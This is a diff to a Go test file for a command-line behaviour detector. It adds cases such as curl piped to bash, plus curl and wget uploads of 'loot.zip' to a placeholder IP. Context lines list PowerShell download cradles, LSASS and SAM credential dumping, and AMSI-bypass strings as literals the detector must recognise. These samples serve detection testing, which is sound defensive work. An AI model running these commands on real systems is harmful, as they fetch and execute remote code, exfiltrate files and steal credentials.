@@ -102,6 +102,13 @@ func TestDetectWindows(t *testing.T) {
 		{"cradle", `IEX (New-Object Net.WebClient).DownloadString($u)`, []string{"FileDownload", "DownloadAndExecute"}},
 		{"piped cradle", `irm $u | iex`, []string{"DownloadAndExecute"}},
 		{"a plain request", `Invoke-WebRequest $u`, nil},
+		{"curl to a file", `curl -s -o /tmp/a.bin http://198.51.100.7/a.bin`, []string{"FileDownload"}},
+		{"curl calling an api", `curl -s -H "Authorization: Bearer $T" https://api.example.com/v1/items`, nil},
+		{"curl sending a file", `curl -s -X POST --data-binary @loot.zip http://198.51.100.7/up`, []string{"FileUpload"}},
+		{"curl piped to a shell", `curl -s http://198.51.100.7/a.sh | bash`, []string{"DownloadAndExecute"}},
+		{"wget", `wget http://198.51.100.7/a.bin`, []string{"FileDownload"}},
+		{"wget posting a file", `wget --post-file=loot.zip http://198.51.100.7/up`, []string{"FileUpload"}},
+		{"requests with a file", `requests.post(url, files={"f": open("loot.zip", "rb")})`, []string{"FileUpload"}},
 		{"assembly from bytes", `$asm = [System.Reflection.Assembly]::Load($bytes)`, []string{"ReflectiveCodeLoading"}},
 		{"assembly in c#", `Assembly.Load(b).EntryPoint.Invoke(null, null);`, []string{"ReflectiveCodeLoading"}},
 		{"p/invoke", `[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);`, []string{"NativeApiCall"}},
@@ -343,6 +350,8 @@ func TestLiteralsAreSound(t *testing.T) {
 		"rundll32 comsvcs.dll, MiniDump 1 f full", "procdump -ma lsass.exe f", "MiniDumpWriteDump",
 		"reg save HKLM\\SAM f", "certutil -exportPFX My x f", "Export-PfxCertificate -Cert c -FilePath f",
 		"bitsadmin /transfer j /upload", "Start-BitsTransfer -Source f -Destination u -TransferType Upload", "$w.UploadFile(u, f)", "reg query HKLM\\Software",
+		"wget http://h/f", "urlretrieve(u, f)", "curl -T f u", "wget --post-file f u", "Invoke-RestMethod u -InFile f", "iwr u -InFile f", "irm u -InFile f",
+		"requests.post(u, files=d)", "curl u | bash",
 		"amsiInitFailed", "New-Object DirectoryServices.DirectorySearcher", "[adsisearcher]'(x)'", "New-Object Management.ManagementObjectSearcher($q)",
 	}
 	check := func(owner string, p pattern) {
